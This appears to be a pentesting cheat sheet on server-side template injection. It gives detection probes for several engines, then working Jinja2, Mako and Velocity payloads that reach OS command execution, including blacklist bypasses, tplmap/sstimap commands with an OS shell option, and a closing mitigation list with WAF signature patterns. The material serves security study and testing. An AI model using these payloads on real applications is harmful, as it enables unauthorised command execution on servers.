---
title: SSTI — from a template to command execution
tags: [web, ssti, jinja2, mako, velocity]
---

# SSTI: when the template evaluates what you send

**English** | [🇪🇸 Español](ssti.md)

## 1. Detection

The server reflects your input inside a template. Try operators per engine:

| Payload | Engine if it returns `49` |
|---|---|
| `{{7*7}}` | Jinja2, Twig, Nunjucks |
| `${7*7}` | Mako, JSP EL, Freemarker |
| `#{7*7}` | Ruby (ERB/Slim) |
| `%{7*7}` | Thymeleaf, Struts |
| `<%= 7*7 %>` | ERB, EJS |

If `{{7*7}}` comes back literal, the engine is not Jinja; if it returns `49`, you already have expression execution.

## 2. Jinja2 (Flask)

The minimum to read config and reach `os`:

```jinja
{{ config }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
```

With a word blacklist (`os`, `system`, `_`), swap to filters and concatenation:

```jinja
{{ lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}
{% set x = 'o' ~ 's' %}{{ cycler.__init__.__globals__[x].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

`{{ ''.__class__.__mro__[1].__subclasses__() }}` inventories classes when `os` is not directly reachable.

## 3. Mako

`self.module` exposes the generated module and, from there, the interpreter:

```mako
${self.module.cache.util.os.popen('id').read()}
${self.module.cache.util.os.system('id')}
```

## 4. Velocity (Java)

With `#set` and reflection (CVE-2020-13936 and friends):

```velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())
#set($p=$rt.exec('id'))
#set($sc=$p.getInputStream())
```

Output is read with a `Scanner` or written into the response; the pattern is always `Class.forName` → `Runtime.exec`.

## 5. Automation

```bash
tplmap -u 'http://<HOST>/?name=*' --os-shell
sstimap -u 'http://<HOST>/?name=INJECT'
```

They try engines, detect context and build the payload. Use them to confirm, not to understand: the writeup deserves the minimal payload that worked.

## 6. Typical errors

- **`49` but empty `config`** → not Flask/Jinja; try Twig (`{{_self.env...}}`).
- **`SecurityError` / `UndefinedError`** → Jinja sandbox (`SandboxedEnvironment`); you need a sandbox escape, not a blacklist bypass.
- **Payload gets URL-encoded** → encode only the needed characters and check whether the parameter is decoded once or twice.
- **Quotes filtered** → use `attr()` with `request.args` or quote-free concatenation.

## 7. Detection and mitigation

- Never render templates from user input; use variables, not dynamic templates.
- Real sandboxing (`SandboxedEnvironment`) and a filter allowlist.
- WAF signatures for `{{`, `${`, `__class__`, `__globals__`; they do not replace the sandbox.
- Track template-engine dependencies (Velocity, Twig, Freemarker) and their RCE CVEs.

MITRE: T1059, T1190.
